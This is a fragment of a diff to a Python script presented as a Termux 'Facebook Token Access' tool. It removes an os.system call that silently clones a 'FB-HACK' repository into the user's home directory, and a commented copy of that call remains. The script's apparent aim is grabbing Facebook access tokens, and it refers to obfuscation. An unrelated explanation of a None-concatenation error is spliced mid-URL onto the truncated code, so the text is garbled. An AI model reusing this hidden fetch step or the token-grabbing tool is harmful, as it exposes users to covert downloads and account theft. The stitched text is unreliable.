@@ -26,12 +26,6 @@ try:
 except KeyError:
     pyobfuscate = ""
 
-try:
-    os.system('cd $HOME && mkdir FACEBOOK_TOKEN && cd FACEBOOK_TOKEN && git clone https://github.com/STARK-404/FB-HACK.git')
-except Exception as e:
-    print(f"An error occurred: {e}")
-
-
 print(" Copy !!  Facebook Token Access (Use For Termux)")
 print('--------------------------------------------')
 #os.system('cd $HOME && mkdir FACEBOOK_TOKEN && cd FACEBOOK_TOKEN && git clone https://github.comThe error in the script occurs due to the attempt to concatenate `None` with a string. Specifically, the line `pyobfuscate += obfuscate['(https://pyobfuscate.com)*(RSA)']` might be causing this issue if `obfuscate['(https://pyobfuscate.com)*(RSA)']` is returning `None`.
